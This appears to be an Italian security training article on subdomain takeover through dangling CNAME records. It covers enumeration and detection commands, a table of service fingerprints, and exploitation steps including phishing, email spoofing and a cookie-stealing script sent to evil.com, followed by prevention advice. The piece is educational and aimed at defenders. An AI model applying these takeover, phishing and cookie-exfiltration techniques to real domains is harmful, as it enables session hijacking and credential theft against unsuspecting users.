---
title: 'Subdomain Takeover: CNAME Dangling, DNS Misconfiguration e Account Takeover'
slug: subdomain-takeover
description: 'Guida completa al Subdomain Takeover: CNAME dangling, servizi cloud dismessi e takeover di sottodomini su AWS, Heroku, GitHub Pages e Azure.'
image: /subdomain-takeover.webp
draft: true
date: 2026-03-19T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - dns
---

# Cos'è Il Subdomain Takeover?

Il **Subdomain Takeover** avviene quando un record DNS (tipicamente un CNAME) punta a un servizio esterno — AWS S3, Heroku, GitHub Pages, Azure, Shopify — che **non esiste più**. Il servizio è stato cancellato, ma il record DNS è rimasto. L'attaccante crea quel servizio con lo stesso nome sul cloud provider e ora controlla il contenuto di `subdomain.target.com`.

Phishing perfetto — certificato SSL valido, dominio aziendale reale, l'utente non ha modo di distinguerlo. I cookie impostati su `.target.com` sono leggibili dal subdomain controllato → **session hijacking cross-subdomain**.

Satellite della [guida pillar Misc & Infra Attacks](https://hackita.it/articoli/misc-infra-attacks-guida-completa). Vedi anche: [Open Redirect](https://hackita.it/articoli/open-redirect), [Session Hijacking](https://hackita.it/articoli/session-hijacking).

Riferimenti: [HackTricks Subdomain Takeover](https://book.hacktricks.wiki/en/pentesting-web/domain-subdomain-takeover.html), [Can I Take Over XYZ](https://github.com/EdOverflow/can-i-take-over-xyz), [OWASP Testing Subdomain Takeover](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover).

***

## Detection

### Step 1: Enumera Subdomini

```bash
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com -o subs_amass.txt
assetfinder --subs-only target.com >> subs_asset.txt
cat subs*.txt | sort -u > all_subs.txt
```

### Step 2: Identifica CNAME Pendenti

```bash
cat all_subs.txt | while read sub; do
  cname=$(dig +short CNAME "$sub" 2>/dev/null)
  if [ -n "$cname" ]; then
    http_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://$sub" 2>/dev/null)
    echo "$sub → $cname [$http_code]"
  fi
done | tee cname_results.txt

# Filtra i sospetti:
grep -iE "404|000|NoSuchBucket|no-such-app|isn't a GitHub|not found|unavailable" cname_results.txt
```

### Step 3: Scan Automatico

```bash
# nuclei (il più affidabile):
nuclei -l all_subs.txt -t http/takeovers/ -o takeover_found.txt

# subjack (veloce):
subjack -w all_subs.txt -t 100 -timeout 30 -o results.txt -ssl

# subzy (moderno):
subzy run --targets all_subs.txt
```

### Step 4: Conferma Manuale

```bash
dig +short CNAME blog.target.com
# → company-blog.s3.amazonaws.com

aws s3 ls s3://company-blog 2>&1
# "NoSuchBucket" → takeover possibile!

curl -s "https://xyz.herokuapp.com" | grep -i "no such app"
# Match → takeover possibile!
```

***

## Fingerprint Per Servizio

| Servizio         | CNAME tipico          | Fingerprint "morto"                         |
| ---------------- | --------------------- | ------------------------------------------- |
| **AWS S3**       | `*.s3.amazonaws.com`  | `NoSuchBucket`                              |
| **GitHub Pages** | `*.github.io`         | "There isn't a GitHub Pages site here"      |
| **Heroku**       | `*.herokuapp.com`     | "No such app"                               |
| **Azure**        | `*.azurewebsites.net` | 404 default Azure                           |
| **Shopify**      | `shops.myshopify.com` | "Sorry, this shop is currently unavailable" |
| **Fastly**       | `*.fastly.net`        | "Fastly error: unknown domain"              |
| **Pantheon**     | `*.pantheonsite.io`   | "404 unknown site"                          |
| **Zendesk**      | `*.zendesk.com`       | "Help Center Closed"                        |
| **Surge.sh**     | `*.surge.sh`          | 404 default surge                           |

Consulta [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) — la lista viene aggiornata quando i provider cambiano policy.

***

## Exploitation

### Phishing Perfetto

```bash
# Crea pagina login identica su blog.target.com:
# SSL valido (Let's Encrypt), dominio aziendale, zero avvisi browser.
# Email: "Aggiorna le credenziali" → link a https://blog.target.com/login
# L'utente si fida del dominio → credenziali catturate.
```

### Cookie Theft Cross-Subdomain

```bash
# Se il cookie dell'app ha Domain=.target.com:
# Set-Cookie: session=abc123; Domain=.target.com

# JavaScript su blog.target.com (controllato dall'attaccante):
<script>
new Image().src = "https://evil.com/steal?c=" + document.cookie;
</script>
# → Il cookie "session" è leggibile! Session Hijacking immediato.
```

### Bypass Email Security

```bash
# SPF: il subdomain è nel DNS di target.com → passa
# DMARC: alignment su target.com → passa
# Email "From: security@blog.target.com" arriva in inbox, non in spam
```

***

## Output Reale

```bash
$ subfinder -d company.it -silent | wc -l
847

$ dig +short CNAME staging.company.it
company-staging.herokuapp.com.

$ curl -s "https://staging.company.it" | head -3
<html><head><title>No such app</title></head>
<body><h1>No such app</h1>
# → TAKEOVER POSSIBILE!

$ heroku create company-staging
Creating company-staging... done

$ curl "https://staging.company.it"
<h1>Subdomain Takeover PoC - HackIta</h1>
# → CONTENUTO CONTROLLATO!
```

***

## Caso Studio

**Settore:** Azienda manifatturiera italiana, 3.000 dipendenti.

847 subdomini trovati. `staging.azienda.it` → CNAME verso app Heroku cancellata 2 anni prima. Takeover eseguito in 3 minuti. Cookie dell'app principale con `Domain=.azienda.it` → session hijacking cross-subdomain dimostrato.

**Un record DNS dimenticato da 2 anni → accesso a tutte le sessioni dell'app principale.**

***

## FAQ

### Il Subdomain Takeover funziona solo con CNAME?

Principalmente sì. Però anche record A che puntano a Elastic IP AWS rilasciati possono essere vulnerabili — se l'IP viene riassegnato a un altro cliente cloud, quel cliente controlla il subdomain.

### Come prevengo il Subdomain Takeover?

Rimuovi i record DNS quando disattivi un servizio. Monitora i CNAME con script automatici. Evita wildcard DNS (`*.target.com`). Imposta i cookie sul dominio più specifico possibile (`app.target.com` invece di `.target.com`).

### Il Subdomain Takeover è accettato nei bug bounty?

La maggior parte dei programmi lo accetta. Crea una pagina PoC neutra ("Subdomain Takeover PoC — \[Your Handle]") e riporta subito. Non usare il subdomain per phishing reale.

### Quanto è comune?

Molto. Le aziende enterprise con centinaia di subdomini hanno quasi sempre almeno un CNAME pendente — servizi test, staging, campagne marketing cancellati ma DNS mai aggiornato.

***

## ✅ Checklist

```
DISCOVERY
☐ Subdomini enumerati (subfinder + amass + assetfinder)
☐ CNAME verificati (dig per ogni subdomain)
☐ nuclei takeover templates eseguito
☐ subjack/subzy eseguito
☐ Fingerprint servizio morto confermato

EXPLOITATION
☐ Servizio creato sul cloud provider
☐ PoC contenuto servito dal subdomain
☐ Cookie Domain=.target.com? → cookie theft testato
☐ Email spoofing via subdomain testato

IMPATTO
☐ Phishing dal dominio aziendale
☐ Cookie theft cross-subdomain
☐ Bypass SPF/DKIM/DMARC
```

***

> I tuoi record DNS puntano a servizi ancora attivi? I cookie hanno `Domain=.target.com`? [Penetration test HackIta](https://hackita.it/servizi). Dal CNAME dimenticato all'account takeover: [formazione 1:1](https://hackita.it/formazione).
